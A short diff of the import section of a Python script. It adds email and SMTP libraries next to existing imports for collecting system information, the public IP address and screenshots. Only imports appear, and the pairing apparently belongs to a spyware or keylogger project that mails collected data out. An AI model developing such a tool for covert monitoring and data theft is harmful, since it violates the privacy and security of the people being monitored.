@@ -1,6 +1,6 @@
 # Libraries
 
-# Libraries for collecting information.
+# Libraries for collecting computer information.
 import socket
 import platform
 
@@ -27,3 +27,10 @@ from requests import get
 # Library for importing screenshots.
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
+
+# Library for email related functions.
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
